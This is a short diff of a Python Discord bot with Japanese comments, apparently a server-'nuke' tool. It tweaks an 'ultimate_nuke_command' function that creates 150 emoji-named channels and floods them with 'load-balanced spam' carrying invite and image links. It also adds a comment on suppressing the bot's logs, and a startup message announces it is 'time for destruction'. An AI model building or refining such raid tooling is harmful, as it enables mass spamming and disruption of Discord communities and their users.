@@ -170,7 +170,8 @@ async def ultimate_nuke_command(ctx):
     creation_tasks = []
     num_channels_to_create = 150
     
-    EMOJIS = "😀😂🤣😇🤓🤪🤩🤔😈☠️💀😹" 
+    # 🚨 修正: チャンネル名に使用する絵文字のリストを最新の状態に変更したぜ！
+    EMOJIS = "😀😂🤣😅😇🤪🤓😈☠️💀😹🤫" 
     EMOJI_LIST = list(EMOJIS) 
     
     channel_names = []
@@ -227,7 +228,7 @@ async def ultimate_nuke_command(ctx):
             "https://discord.gg/Uv4dh5nZz6\n"
             "https://imgur.com/NbBGFcf"
         )
-        # 🚨 修正: スパム回数を15回に戻す
+        # 🚨 修正: スパム回数は15回
         spam_count = 15
         
         await successful_channels[0].send(f"📣 **LOAD-BALANCED SPAM STARTED!** {len(successful_channels)}個の新しいチャンネルに、今から **{spam_count}回** の**負荷分散スパム**を送りつけるぞ！（1リクエストあたり最小0.02秒だ！）")
@@ -395,6 +396,7 @@ def start_bot():
     else:
         logging.warning("Discord Botを起動中... 破壊の時だ。")
         try:
+            # ログハンドラをNoneにして、Botの標準ログを抑制
             bot.run(DISCORD_BOT_TOKEN, log_handler=None) 
             
         except discord.errors.LoginFailure:
